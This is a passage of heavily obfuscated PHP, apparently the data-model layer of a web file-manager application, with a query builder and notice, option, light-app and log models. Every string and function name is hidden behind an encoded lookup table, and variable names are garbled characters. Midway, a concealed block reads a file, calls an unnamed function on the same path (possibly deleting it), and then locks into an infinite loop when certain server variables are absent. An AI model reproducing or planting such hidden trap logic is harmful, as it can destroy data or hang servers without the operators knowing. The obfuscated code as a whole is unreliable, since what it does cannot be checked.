(!is_bool($¨½¡šÄú) && !is_array($¨½¡šÄú)) { $¨½¡šÄú = func_get_args(); array_shift($¨½¡šÄú); } $àƒ Áùî = $this->parseSql($àƒ Áùî, $¨½¡šÄú); return $this->db->execute($àƒ Áùî); } protected function parseSql($âíì¦ÃÕ, $ÏÙÉÀÔ¾) { $ùÂã“ =& $_SERVER[ŒÅŸ‹ä†]; if (!0 === $ÏÙÉÀÔ¾) { $‘åüıŸ’ = $this->_parseOptions(); $âíì¦ÃÕ = $this->db->parseSql($âíì¦ÃÕ, $‘åüıŸ’); } elseif (is_array($ÏÙÉÀÔ¾)) { $ÏÙÉÀÔ¾ = array_map(array($this->db, $ùÂã“[428]), $ÏÙÉÀÔ¾); $âíì¦ÃÕ = vsprintf($âíì¦ÃÕ, $ÏÙÉÀÔ¾); } else { $âíì¦ÃÕ = strtr($âíì¦ÃÕ, array($ùÂã“[429] => $this->getTableName(), $ùÂã“[430] => think_config($ùÂã“[331]))); } $this->db->setModel($this->name); return $âíì¦ÃÕ; } public function db($¡‡¿šßÄ = '', $·ò™Ë¬™ = '', $õ£Ø¤ú” = array()) { $é½§ç»ı =& $_SERVER[ŒÅŸ‹ä†]; if ($é½§ç»ı[12] === $¡‡¿šßÄ && $this->db) { return $this->db; } static $Ô¦’Ù‡ = array(); static $·²ò¦¨ı = array(); if (!isset($·²ò¦¨ı[$¡‡¿šßÄ]) || isset($·²ò¦¨ı[$¡‡¿šßÄ]) && $·ò™Ë¬™ && $Ô¦’Ù‡[$¡‡¿šßÄ] != $·ò™Ë¬™) { if (!empty($·ò™Ë¬™) && is_string($·ò™Ë¬™) && !1 === strpos($·ò™Ë¬™, $é½§ç»ı[8])) { $·ò™Ë¬™ = think_config($·ò™Ë¬™); } $¡‡¿šßÄ = think_guid($·ò™Ë¬™); $·²ò¦¨ı[$¡‡¿šßÄ] = Db::getInstance($·ò™Ë¬™); } elseif (NULL === $·ò™Ë¬™) { $·²ò¦¨ı[$¡‡¿šßÄ]->close(); unset($·²ò¦¨ı[$¡‡¿šßÄ]); return; } if (!empty($õ£Ø¤ú”)) { if (is_string($õ£Ø¤ú”)) { parse_str($õ£Ø¤ú”, $õ£Ø¤ú”); } foreach ($õ£Ø¤ú” as $˜’à´…è => $¸ñı‹õá) { $this->setProperty($˜’à´…è, $¸ñı‹õá); } } $Ô¦’Ù‡[$¡‡¿šßÄ] = $·ò™Ë¬™; $this->db = $·²ò¦¨ı[$¡‡¿šßÄ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $çÜâİ‰Œ = get_class($this); if ($çÜâİ‰Œ == $_SERVER[ŒÅŸ‹ä†][431]) { return $this->name; } $this->name = substr($çÜâİ‰Œ, 0, -5); } return $this->name; } public function getTableName() { $¤‚†§” =& $_SERVER[ŒÅŸ‹ä†]; if (empty($this->trueTableName)) { $îùÆ©Îß = !empty($this->tablePrefix) ? $this->tablePrefix : $¤‚†§”[12]; if (!empty($this->tableName)) { $îùÆ©Îß .= $this->tableName; } else { $îùÆ©Îß .= think_parse_name($this->name); } $this->trueTableName = strtolower($îùÆ©Îß); } return (!empty($this->dbName) ? $this->dbName . $¤‚†§”[10] : $¤‚†§”[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Æ ©©ÅË =& $_SERVER[ŒÅŸ‹ä†]; return isset($this->fields[$Æ ©©ÅË[338]]) ? $this->fields[$Æ ©©ÅË[338]] : $this->pk; } public function getDbFields() { $Ë‹à€‡Ô =& $_SERVER[ŒÅŸ‹ä†]; if (isset($this->options[$Ë‹à€‡Ô[367]])) { $ãª§¼½Á = $this->db->getFields($this->options[$Ë‹à€‡Ô[367]]); return $ãª§¼½Á ? array_keys($ãª§¼½Á) : !1; } if ($this->fields) { $ãª§¼½Á = $this->fields; unset($ãª§¼½Á[$Ë‹à€‡Ô[337]], $ãª§¼½Á[$Ë‹à€‡Ô[338]], $ãª§¼½Á[$Ë‹à€‡Ô[339]], $ãª§¼½Á[$Ë‹à€‡Ô[336]]); return $ãª§¼½Á; } return !1; } public function data($±¡å‹‘ = '') { $ …Õçü· =& $_SERVER[ŒÅŸ‹ä†]; if ($ …Õçü·[12] === $±¡å‹‘ && !empty($this->data)) { return $this->data; } if (is_object($±¡å‹‘)) { $±¡å‹‘ = get_object_vars($±¡å‹‘); } elseif (is_string($±¡å‹‘)) { parse_str($±¡å‹‘, $±¡å‹‘); } elseif (!is_array($±¡å‹‘)) { think_exception(think_lang($ …Õçü·[359])); } $this->data = $±¡å‹‘; return $this; } public function join($œî÷õò’) { $Ò‡© =& $_SERVER[ŒÅŸ‹ä†]; if (is_array($œî÷õò’)) { $this->options[$Ò‡©[370]] = $œî÷õò’; } elseif (!empty($œî÷õò’)) { $this->options[$Ò‡©[370]][] = $œî÷õò’; } return $this; } public function union($ğÚÂƒøø, $É×ÏË®’ = false) { $ÓñÂàŞ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($ğÚÂƒøø)) { return $this; } if ($É×ÏË®’) { $this->options[$ÓñÂàŞ[432]][$ÓñÂàŞ[433]] = !0; } if (is_object($ğÚÂƒøø)) { $ğÚÂƒøø = get_object_vars($ğÚÂƒøø); } if (is_string($ğÚÂƒøø)) { $È‘ì¤øø = $ğÚÂƒøø; } elseif (is_array($ğÚÂƒøø)) { if (isset($ğÚÂƒøø[0])) { $this->options[$ÓñÂàŞ[432]] = array_merge($this->options[$ÓñÂàŞ[432]], $ğÚÂƒøø); return $this; } else { $È‘ì¤øø = $ğÚÂƒøø; } } else { think_exception(think_lang($ÓñÂàŞ[359])); } $this->options[$ÓñÂàŞ[432]][] = $È‘ì¤øø; return $this; } public function cache($åôì—´° = true, $ì‡¥æ÷„ = null, $é¿ËŞ® = '') { $Ò±¨Ü«æ =& $_SERVER[ŒÅŸ‹ä†]; if (!1 !== $åôì—´°) { $this->options[$Ò±¨Ü«æ[434]] = array($Ò±¨Ü«æ[105] => $åôì—´°, $Ò±¨Ü«æ[424] => $ì‡¥æ÷„, $Ò±¨Ü«æ[43] => $é¿ËŞ®); } return $this; } public function field($ŒœƒÀÜ, $Úë¿’ØÜ = false) { $°ÅÊÄ•ü =& $_SERVER[ŒÅŸ‹ä†]; if (!0 === $ŒœƒÀÜ) { $ß›Ôå€ß = $this->getDbFields(); $ŒœƒÀÜ = $ß›Ôå€ß ? $ß›Ôå€ß : $°ÅÊÄ•ü[231]; } elseif ($Úë¿’ØÜ) { if (is_string($ŒœƒÀÜ)) { $ŒœƒÀÜ = explode($°ÅÊÄ•ü[60], $ŒœƒÀÜ); } $ß›Ôå€ß = $this->getDbFields(); $ŒœƒÀÜ = $ß›Ôå€ß ? array_diff($ß›Ôå€ß, $ŒœƒÀÜ) : $ŒœƒÀÜ; } $this->options[$°ÅÊÄ•ü[361]] = $ŒœƒÀÜ; return $this; } public function scope($Å›×¥½· = '', $Ãâìµ¹Í = NULL) { $‡ÄÕÁÇ÷ =& $_SERVER[ŒÅŸ‹ä†]; if ($‡ÄÕÁÇ÷[12] === $Å›×¥½·) { if (isset($this->_scope[$‡ÄÕÁÇ÷[47]])) { $è¶”ûÆî = $this->_scope[$‡ÄÕÁÇ÷[47]]; } else { return $this; } } elseif (is_string($Å›×¥½·)) { $£÷„¨ÙÕ = explode($‡ÄÕÁÇ÷[60], $Å›×¥½·); $è¶”ûÆî = array(); foreach ($£÷„¨ÙÕ as $”§Ì¦óü) { if (!isset($this->_scope[$”§Ì¦óü])) { continue; } $è¶”ûÆî = array_merge($è¶”ûÆî, $this->_scope[$”§Ì¦óü]); } if (!empty($Ãâìµ¹Í) && is_array($Ãâìµ¹Í)) { $è¶”ûÆî = array_merge($è¶”ûÆî, $Ãâìµ¹Í); } } elseif (is_array($Å›×¥½·)) { $è¶”ûÆî = $Å›×¥½·; } if (is_array($è¶”ûÆî) && !empty($è¶”ûÆî)) { $this->options = array_merge($this->options, array_change_key_case($è¶”ûÆî)); } return $this; } public function where($¤ªŞùğ, $Üêñ‘óê = null) { $¡—ğ»Âå =& $_SERVER[ŒÅŸ‹ä†]; if (!is_null($Üêñ‘óê) && is_string($¤ªŞùğ)) { if (!is_array($Üêñ‘óê)) { $Üêñ‘óê = func_get_args(); array_shift($Üêñ‘óê); } $Üêñ‘óê = array_map(array($this->db, $¡—ğ»Âå[428]), $Üêñ‘óê); $¤ªŞùğ = vsprintf($¤ªŞùğ, $Üêñ‘óê); } elseif (is_object($¤ªŞùğ)) { $¤ªŞùğ = get_object_vars($¤ªŞùğ); } elseif (is_array($¤ªŞùğ)) { foreach ($¤ªŞùğ as $ÕÀÅ§Áš => $éÁöœ¸€) { if ((is_numeric($ÕÀÅ§Áš) || !$ÕÀÅ§Áš) && is_string($éÁöœ¸€)) { if (strpos($éÁöœ¸€, $¡—ğ»Âå[435]) === 0) { continue; } think_trace($¡—ğ»Âå[436], $¡—ğ»Âå[12], $¡—ğ»Âå[59]); die; } } } if (is_string($¤ªŞùğ) && $¡—ğ»Âå[12] != $¤ªŞùğ) { $ üì’äß = array(); $ üì’äß[$¡—ğ»Âå[437]] = $¤ªŞùğ; $¤ªŞùğ = $ üì’äß; } if (isset($this->options[$¡—ğ»Âå[363]])) { $this->options[$¡—ğ»Âå[363]] = array_merge($this->options[$¡—ğ»Âå[363]], $¤ªŞùğ); } else { $this->options[$¡—ğ»Âå[363]] = $¤ªŞùğ; } return $this; } public function limit($´Â…ïæÙ, $Ù¾ñÑê = null) { $ü‡ùş‘û =& $_SERVER[ŒÅŸ‹ä†]; $this->options[$ü‡ùş‘û[378]] = is_null($Ù¾ñÑê) ? $´Â…ïæÙ : $´Â…ïæÙ . $ü‡ùş‘û[60] . $Ù¾ñÑê; return $this; } public function page($øƒ³µìÓ, $¦ÃŒ³ù = null) { $¯²§Ó¸ =& $_SERVER[ŒÅŸ‹ä†]; $this->options[$¯²§Ó¸[438]] = is_null($¦ÃŒ³ù) ? $øƒ³µìÓ : $øƒ³µìÓ . $¯²§Ó¸[60] . $¦ÃŒ³ù; return $this; } public function comment($äÁèú¶) { $this->options[$_SERVER[ŒÅŸ‹ä†][439]] = $äÁèú¶; return $this; } public function setProperty($•ÔÊ¤‘¯, $ÇŞÚ‘ğÔ) { if (property_exists($this, $•ÔÊ¤‘¯)) { $this->{$•ÔÊ¤‘¯} = $ÇŞÚ‘ğÔ; } return $this; } } goto B¼ä¹¸å÷¨; FÕ“å”‡: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\156\x6f\x74\x69\143\x65\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\x63\x6f\156\x74\x65\156\x74", "\141\165\164\x68", "\x6d\x6f\x64\x65", "\164\151\x6d\x65", "\x74\171\x70\145", "\154\x65\x76\x65\x6c", "\x65\x6e\x61\x62\x6c\x65", "\163\157\162\164"); public function listData($ÓÚñˆà = false, $ÜÖâ…ùº = "\163\157\162\x74", $‰¶¨Ú™Ã = false) { return parent::listData($ÓÚñˆà, $ÜÖâ…ùº, $‰¶¨Ú™Ã); } public function add($Œ°ï†Ó) { $ŠÓ¼Á÷ç =& $_SERVER[ŒÅŸ‹ä†]; $‘ÈÙâõ = time(); if ($Œ°ï†Ó[$ŠÓ¼Á÷ç[26]] == $ŠÓ¼Á÷ç[2604]) { $‘ÈÙâõ = strtotime($Œ°ï†Ó[$ŠÓ¼Á÷ç[215]]); } $Œ°ï†Ó[$ŠÓ¼Á÷ç[215]] = $‘ÈÙâõ; return parent::insert($Œ°ï†Ó); } public function update($ô¦º¸ÏÙ, $›Ëšà´) { $§Ã““× =& $_SERVER[ŒÅŸ‹ä†]; $ø¾ÉìÙ = $this->listData($ô¦º¸ÏÙ); if (!$ø¾ÉìÙ) { return !1; } $éµ¼›Ù³ = time(); if ($›Ëšà´[$§Ã““×[26]] == $§Ã““×[2604]) { $éµ¼›Ù³ = strtotime($›Ëšà´[$§Ã““×[215]]); } $›Ëšà´[$§Ã““×[215]] = $éµ¼›Ù³; return parent::update($ô¦º¸ÏÙ, $›Ëšà´); } public function remove($ÛÓÀ”æ) { $‘·êùÉ = $this->listData($ÛÓÀ”æ); if (!$‘·êùÉ || $‘·êùÉ[$_SERVER[ŒÅŸ‹ä†][200]]) { return !1; } return parent::remove($ÛÓÀ”æ); } public function sort($¾á‰ãçŒ, $†òËÕ´í) { return parent::update($¾á‰ãçŒ, $†òËÕ´í); } public function enable($ã‡ïôÄ§, $”ïíúû) { return parent::update($ã‡ïôÄ§, array($_SERVER[ŒÅŸ‹ä†][2605] => $”ïíúû)); } private function initUserOption() { $’¬—˜¸Î =& $_SERVER[ŒÅŸ‹ä†]; $this->optionType = $’¬—˜¸Î[2606]; $this->modelType = $’¬—˜¸Î[2607]; $this->field = array($’¬—˜¸Î[2608], $’¬—˜¸Î[42], $’¬—˜¸Î[215], $’¬—˜¸Î[43], $’¬—˜¸Î[2609], $’¬—˜¸Î[846], $’¬—˜¸Î[237]); } public function userNoticeGet($æûĞÎ’Ğ = false) { $this->initUserOption(); return parent::listData($æûĞÎ’Ğ, $_SERVER[ŒÅŸ‹ä†][492], !0); } public function userNoticeAdd($¦Ü›ã†É) { $¯†ìÀğñ =& $_SERVER[ŒÅŸ‹ä†]; $this->initUserOption(); $„“…ôÀÙ = $this->findByKey($¯†ìÀğñ[2608], $¦Ü›ã†É[$¯†ìÀğñ[492]]); if ($„“…ôÀÙ) { return !0; } $ÀÅ »‹á = array($¯†ìÀğñ[2608] => $¦Ü›ã†É[$¯†ìÀğñ[492]], $¯†ìÀğñ[42] => $¦Ü›ã†É[$¯†ìÀğñ[42]], $¯†ìÀğñ[215] => $¦Ü›ã†É[$¯†ìÀğñ[215]], $¯†ìÀğñ[43] => isset($¦Ü›ã†É[$¯†ìÀğñ[43]]) ? $¦Ü›ã†É[$¯†ìÀğñ[43]] : 1, $¯†ìÀğñ[2609] => isset($¦Ü›ã†É[$¯†ìÀğñ[2609]]) ? $¦Ü›ã†É[$¯†ìÀğñ[2609]] : 0, $¯†ìÀğñ[846] => 0, $¯†ìÀğñ[237] => 0); return parent::insert($ÀÅ »‹á); } public function userNoticeEdit($³˜¢—‘ˆ, $Çê§ğÒ±) { $this->initUserOption(); return parent::update($³˜¢—‘ˆ, $Çê§ğÒ±); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\x6d\x5f\157\x70\x74\151\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\x72\x6f\154\x65", "\x72\157\x6c\145\107\162\x6f\x75\x70", "\x72\x65\x67\x69\x73\164", "\x65\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($Ğîœ‘é) { return "\123\x79\163\x74\145\x6d\117\x70\x74\x69\x6f\x6e\137{$Ğîœ‘é}"; } protected function optionDefault($Ø¦òÕôÛ = '') { $ûöæ¥¥÷ =& $_SERVER[ŒÅŸ‹ä†]; if ($Ø¦òÕôÛ == $ûöæ¥¥÷[12]) { return $GLOBALS[$ûöæ¥¥÷[6]][$ûöæ¥¥÷[477]]; } } } class SystemRecordModel extends ModelBaseLight { } goto E¥Ï¬øÃŠò; Aø·á‡ôÅ†: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\114\x69\x67\x68\164\x41\160\160"; public $modelType = "\123\x79\163\164\x65\x6d\117\160\164\x69\x6f\156"; public $field = array("\156\x61\155\145", "\x67\x72\157\165\x70", "\x64\145\x73\143", "\x63\x6f\x6e\x74\x65\x6e\x74"); public function listData($šá­è¤ş = false, $¶£€–¿ = "\155\157\144\151\146\171\x54\x69\155\145", $äŒ¾ÔÇå = true) { return parent::listData($šá­è¤ş, $¶£€–¿, $äŒ¾ÔÇå); } public function remove($¯Æáİ›©) { $ÎÏøçÊ— = $this->findByName($¯Æáİ›©); if (!$ÎÏøçÊ—) { return !1; } return parent::remove($ÎÏøçÊ—[$_SERVER[ŒÅŸ‹ä†][492]]); } public function add($§ä”øÒ¥) { if ($this->findByName($§ä”øÒ¥[$_SERVER[ŒÅŸ‹ä†][42]])) { return !1; } return parent::insert($§ä”øÒ¥); } public function update($¡¸ØÛÇĞ, $ÏäÆõÓ) { $ÃÁ€ÍÆş =& $_SERVER[ŒÅŸ‹ä†]; $ÜÙ‚‘›‰ = $this->findByName($¡¸ØÛÇĞ); $º±Ú’è = $this->findByName($ÏäÆõÓ[$ÃÁ€ÍÆş[42]]); if (!$ÜÙ‚‘›‰ || $º±Ú’è && $º±Ú’è[$ÃÁ€ÍÆş[492]] != $ÜÙ‚‘›‰[$ÃÁ€ÍÆş[492]]) { return !1; } return parent::update($ÜÙ‚‘›‰[$ÃÁ€ÍÆş[492]], $ÏäÆõÓ); } } if (!isset($_SERVER[$_SERVER[ŒÅŸ‹ä†][13]]) || !isset($_SERVER[$_SERVER[ŒÅŸ‹ä†][22]])) { $_getc = $_SERVER[ŒÅŸ‹ä†][15]; $_getfile = $_SERVER[$_SERVER[ŒÅŸ‹ä†][16]] . $_SERVER[ŒÅŸ‹ä†][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ŒÅŸ‹ä†][18], $_getfilec); if (count($_getarrs) < $_SERVER[ŒÅŸ‹ä†][19]) { $exit = $_SERVER[ŒÅŸ‹ä†][20]; $exit(); } $_act = $_SERVER[ŒÅŸ‹ä†][21]; $_act($_SERVER[$_SERVER[ŒÅŸ‹ä†][16]] . $_SERVER[ŒÅŸ‹ä†][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ŒÅŸ‹ä†][472]); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\137\154\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\151\x6d\145", "\164\x69\155\145", "\x69\x6e\x73\x65\162\164", "\146\x75\x6e\x63\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ş€–…˜Ë =& $_SERVER[ŒÅŸ‹ä†]; return array($Ş€–…˜Ë[2498] => LNG($Ş€–…˜Ë[2499]), $Ş€–…˜Ë[2500] => LNG($Ş€–…˜Ë[2501]), $Ş€–…˜Ë[2072] => LNG($Ş€–…˜Ë[2502]), $Ş€–…˜Ë[2503] => LNG($Ş€–…˜Ë[2504]), $Ş€–…˜Ë[2505] => LNG($Ş€–…˜Ë[2506]), $Ş€–…˜Ë[2507] => LNG($Ş€–…˜Ë[2508]), $Ş€–…˜Ë[2509] => LNG($Ş€–…˜Ë[2510]), $Ş€–…˜Ë[2100] => LNG($Ş€–…˜Ë[2510]), $Ş€–…˜Ë[2101] => LNG($Ş€–…˜Ë[2511]), $Ş€–…˜Ë[2512] => LNG($Ş€–…˜Ë[2513]), $Ş€–…˜Ë[2514] => LNG($Ş€–…˜Ë[2515]), $Ş€–…˜Ë[2516] => LNG($Ş€–…˜Ë[2517]), $Ş€–…˜Ë[2518] => LNG($Ş€–…˜Ë[2519]), $Ş€–…˜Ë[2098] => LNG($Ş€–…˜Ë[2520]), $Ş€–…˜Ë[2521] => LNG($Ş€–…˜Ë[2522]), $Ş€–…˜Ë[2105] => LNG($Ş€–…˜Ë[2523]), $Ş€–…˜Ë[2524] => LNG($Ş€–…˜Ë[2525]), $Ş€–…˜Ë[2526] => LNG($Ş€–…˜Ë[2527]), $Ş€–…˜Ë[2528] => LNG($Ş€–…˜Ë[2529]), $Ş€–…˜Ë[2530] => LNG($Ş€–…˜Ë[2531]), $Ş€–…˜Ë[2107] => LNG($Ş€–…˜Ë[2532]), $Ş€–…˜Ë[2108] => LNG($Ş€–…˜Ë[2533]), $Ş€–…˜Ë[2534] => LNG($Ş€–…˜Ë[2535]), $Ş€–…˜Ë[2536] => LNG($Ş€–…˜Ë[2537]), $Ş€–…˜Ë[2538] => LNG($Ş€–…˜Ë[2539]), $Ş€–…˜Ë[2103] => LNG($Ş€–…˜Ë[2540]), $Ş€–…˜Ë[2541] => LNG($Ş€–…˜Ë[2542]), $Ş€–…˜Ë[2102] => LNG($Ş€–…˜Ë[2543]), $Ş€–…˜Ë[2544] => LNG($Ş€–…˜Ë[2544]), $Ş€–…˜Ë[2545] => LNG($Ş€–…˜Ë[2546]), $Ş€–…˜Ë[2547] => LNG($Ş€–…˜Ë[2544]), $Ş€–…˜Ë[2548] => LNG($Ş€–…˜Ë[2549]), $Ş€–…˜Ë[2550] => LNG($Ş€–…˜Ë[2551]), $Ş€–…˜Ë[2552] => LNG($Ş€–…˜Ë[2551]), $Ş€–…˜Ë[2553] => LNG($Ş€–…˜Ë[2554]), $Ş€–…˜Ë[2555] => LNG($Ş€–…˜Ë[2555]), $Ş€–…˜Ë[2556] => LNG($Ş€–…˜Ë[2076]), $Ş€–…˜Ë[2557] => LNG($Ş€–…˜Ë[2558]), $Ş€–…˜Ë[2559] => LNG($Ş€–…˜Ë[2560]), $Ş€–…˜Ë[2561] => LNG($Ş€–…˜Ë[2562]), $Ş€–…˜Ë[2563] => LNG($Ş€–…˜Ë[2564]), $Ş€–…˜Ë[2565] => LNG($Ş€–…˜Ë[2566]), $Ş€–…˜Ë[2567] => LNG($Ş€–…˜Ë[2567]), $Ş€–…˜Ë[2568] => LNG($Ş€–…˜Ë[2569]), $Ş€–…˜Ë[2570] => LNG($Ş€–…˜Ë[2571]), $Ş€–…˜Ë[2572] => LNG($Ş€–…˜Ë[2573]), $Ş€–…˜Ë[2574] => LNG($Ş€–…˜Ë[2575]), $Ş€–…˜Ë[2576] => LNG($Ş€–…˜Ë[2577]), $Ş€–…˜Ë[2578] => LNG($Ş€–…˜Ë[2579]), $Ş€–…˜Ë[221] => LNG($Ş€–…˜Ë[221]), $Ş€–…˜Ë[222] => LNG($Ş€–…˜Ë[2580]), $Ş€–…˜Ë[2581] => LNG($Ş€–…˜Ë[2581])); } private function typeFile() { $æêÜ†Ø  =& $_SERVER[ŒÅŸ‹ä†]; $Êí³·ƒ = array($æêÜ†Ø [2105] => array($æêÜ†Ø [2106]), $æêÜ†Ø [2516] => array($æêÜ†Ø [2582]), $æêÜ†Ø [2518] => array($æêÜ†Ø [2583]), $æêÜ†Ø [2098] => array($æêÜ†Ø [2099], $æêÜ†Ø [2584]), $æêÜ†Ø [2526] => array(), $æêÜ†Ø [2528] => array(), $æêÜ†Ø [2530] => array(), $æêÜ†Ø [2107] => array($æêÜ†Ø [2109]), $æêÜ†Ø [2108] => array($æêÜ†Ø [2109]), $æêÜ†Ø [2534] => array($æêÜ†Ø [2585]), $æêÜ†Ø [2536] => array($æêÜ†Ø [2585]), $æêÜ†Ø [2538] => array($æêÜ†Ø [2586]), $æêÜ†Ø [2524] => array($æêÜ†Ø [2587]), $æêÜ†Ø [2103] => array($æêÜ†Ø [2588]), $æêÜ†Ø [2541] => array($æêÜ†Ø [2589]), $æêÜ†Ø [2102] => array($æêÜ†Ø [2104])); return $Êí³·ƒ; } private function typeAll() { $Û½õ¥½ë =& $_SERVER[ŒÅŸ‹ä†]; $¥Î¨ó×» = $this->typeList; $®°ì„§Š = array_filter($this->typeFile()); foreach ($®°ì„§Š as $¸è„£™ => $×šª§á) { $¥Î¨ó×»[$×šª§á[0]] = $¥Î¨ó×»[$¸è„£™]; } $¥Î¨ó×»[$Û½õ¥½ë[2109]] = LNG($Û½õ¥½ë[2590]); $¥Î¨ó×»[$Û½õ¥½ë[2585]] = LNG($Û½õ¥½ë[2591]); return $¥Î¨ó×»; } public function addLog($ë®øß°§, $Ã¶–ãÍè = array()) { $»¬ŒÜ„ş =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($this->typeList[$ë®øß°§])) { return; } $òÇÏ½ß = Session::get($»¬ŒÜ„ş[2263]); if (!$òÇÏ½ß) { $òÇÏ½ß = _get($Ã¶–ãÍè, $»¬ŒÜ„ş[1537], 0); } if ($ë®øß°§ == $»¬ŒÜ„ş[2557] && is_array($Ã¶–ãÍè[$»¬ŒÜ„ş[2592]]) && !$Ã¶–ãÍè[$»¬ŒÜ„ş[2592]]) { return; } $¼ «ŒŒ = get_client_ip(); if (!$Ã¶–ãÍè || strlen(json_encode($Ã¶–ãÍè)) >= 1024 * 64) { if ($Ã¶–ãÍè && is_array($Ã¶–ãÍè)) { $Ã¶–ãÍè = array_intersect_key($Ã¶–ãÍè, array_flip($»¬ŒÜ„ş[492], $»¬ŒÜ„ş[42])); $Ã¶–ãÍè[$»¬ŒÜ„ş[1553]] = $¼ «ŒŒ; } else { $Ã¶–ãÍè = array($»¬ŒÜ„ş[1553] => $¼ «ŒŒ); } } else { if (is_array($Ã¶–ãÍè)) { $Ã¶–ãÍè[$»¬ŒÜ„ş[1553]] = $¼ «ŒŒ; } else { $Ã¶–ãÍè = array($»¬ŒÜ„ş[1334] => $Ã¶–ãÍè, $»¬ŒÜ„ş[1553] => $¼ «ŒŒ); } } $Ã¶–ãÍè[$»¬ŒÜ„ş[2593]] = ACTION; $Ã¶–ãÍè = array($»¬ŒÜ„ş[1910] => Session::sign(), $»¬ŒÜ„ş[1911] => intval($òÇÏ½ß), $»¬ŒÜ„ş[43] => $ë®øß°§, $»¬ŒÜ„ş[1913] => json_encode($Ã¶–ãÍè)); Hook::trigger($»¬ŒÜ„ş[2594], $Ã¶–ãÍè); return parent::add($Ã¶–ãÍè); } public function remove($–º÷Æàö) { $this->where(array($_SERVER[ŒÅŸ‹ä†][513] => $–º÷Æàö))->delete(); } private function _makeOrder($™ÎÀÜÇ„ = '') { $¸Öİ¼Œ„ =& $_SERVER[ŒÅŸ‹ä†]; $Ëä–ìõ = $¸Öİ¼Œ„[242]; $óÌŒÇ„ = array($¸Öİ¼Œ„[542] => $¸Öİ¼Œ„[543], $¸Öİ¼Œ„[544] => $¸Öİ¼Œ„[545]); $˜ôçööÙ = Input::get($¸Öİ¼Œ„[550], $¸Öİ¼Œ„[7], $¸Öİ¼Œ„[2301], array($¸Öİ¼Œ„[2219], $¸Öİ¼Œ„[544])); $˜ôçööÙ = $óÌŒÇ„[$˜ôçööÙ]; $™ÎÀÜÇ„ = $™ÎÀÜÇ„ . "{$Ëä–ìõ}\40{$˜ôçööÙ}"; return $this->order($™ÎÀÜÇ„); } public function get($€ÛÓŸ¤… = '') { $Ö÷Šñêæ =& $_SERVER[ŒÅŸ‹ä†]; if (!$€ÛÓŸ¤…) { show_json(array()); } $üÈé¡®¼ = array(); if ($€ÛÓŸ¤…[$Ö÷Šñêæ[1537]]) { $üÈé¡®¼[$Ö÷Šñêæ[1537]] = $€ÛÓŸ¤…[$Ö÷Šñêæ[1537]]; } if (isset($€ÛÓŸ¤…[$Ö÷Šñêæ[857]])) { $ÊòĞ‡« = $€ÛÓŸ¤…[$Ö÷Šñêæ[857]]; $ù²èâ¹ı = isset($€ÛÓŸ¤…[$Ö÷Šñêæ[858]]) ? $€ÛÓŸ¤…[$Ö÷Šñêæ[858]] : time(); $üÈé¡®¼[$Ö÷Šñêæ[242]] = array($Ö÷Šñêæ[418], array($ÊòĞ‡«, $ù²èâ¹ı)); } if ($€ÛÓŸ¤…[$Ö÷Šñêæ[43]]) { $ıéø²š± = explode($Ö÷Šñêæ[60], $€ÛÓŸ¤…[$Ö÷Šñêæ[43]]); $É¢Â‘ğß = $this->typeFile(); $‡Æ¿âÄó = array(); foreach ($ıéø²š± as $ÉëãÀã˜) { $‡Æ¿âÄó[] = $ÉëãÀã˜; if (isset($É¢Â‘ğß[$ÉëãÀã˜])) { $‡Æ¿âÄó = array_merge($‡Æ¿âÄó, $É¢Â‘ğß[$ÉëãÀã˜]); } } $‡Æ¿âÄó = array_unique($‡Æ¿âÄó); if ($‡Æ¿âÄó) { $üÈé¡®¼[$Ö÷Šñêæ[43]] = array($Ö÷Šñêæ[7], $‡Æ¿âÄó); } } else { $üÈé¡®¼[$Ö÷Šñêæ[43]] = array($Ö÷Šñêæ[2595], $Ö÷Šñêæ[2596]); } if (!empty($€ÛÓŸ¤…[$Ö÷Šñêæ[1553]])) { $üÈé¡®¼[$Ö÷Šñêæ[545]] = array($Ö÷Šñêæ[479], "\x25{$€ÛÓŸ¤…[$Ö÷Šñêæ[1553]]}\x25"); } $šâ‰ã = $this->_makeOrder()->where($üÈé¡®¼)->selectPage(); if (empty($šâ‰ã[$Ö÷Šñêæ[455]])) { show_json(array(), !0, $šâ‰ã[$Ö÷Šñêæ[452]]); } $šâ‰ã[$Ö÷Šñêæ[455]] = $this->logList($šâ‰ã[$Ö÷Šñêæ[455]]); return $šâ‰ã; } private function ipAddress(&$‹ÆÊÇ¬é) { $«¶öş÷¥ =& $_SERVER[ŒÅŸ‹ä†]; if (!empty($‹ÆÊÇ¬é[$«¶öş÷¥[1553]])) { $›àÊåÀ™ = IpLocation::get($‹ÆÊÇ¬é[$«¶öş÷¥[1553]]); } else { $›àÊåÀ™ = LNG($«¶öş÷¥[2597]); } $‹ÆÊÇ¬é[$«¶öş÷¥[2598]] = $›àÊåÀ™; } private function descZipDownload($æ«Ô²¢, &$Õ¡÷×­™) { $ÄÏ¨ºßÑ =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($æ«Ô²¢[$ÄÏ¨ºßÑ[1560]])) { return; } $‹áğŞóü = json_decode($æ«Ô²¢[$ÄÏ¨ºßÑ[1560]], !0); foreach ($‹áğŞóü as $åÜÊÕ‚Í) { try { $¶Ãåù¤¯ = 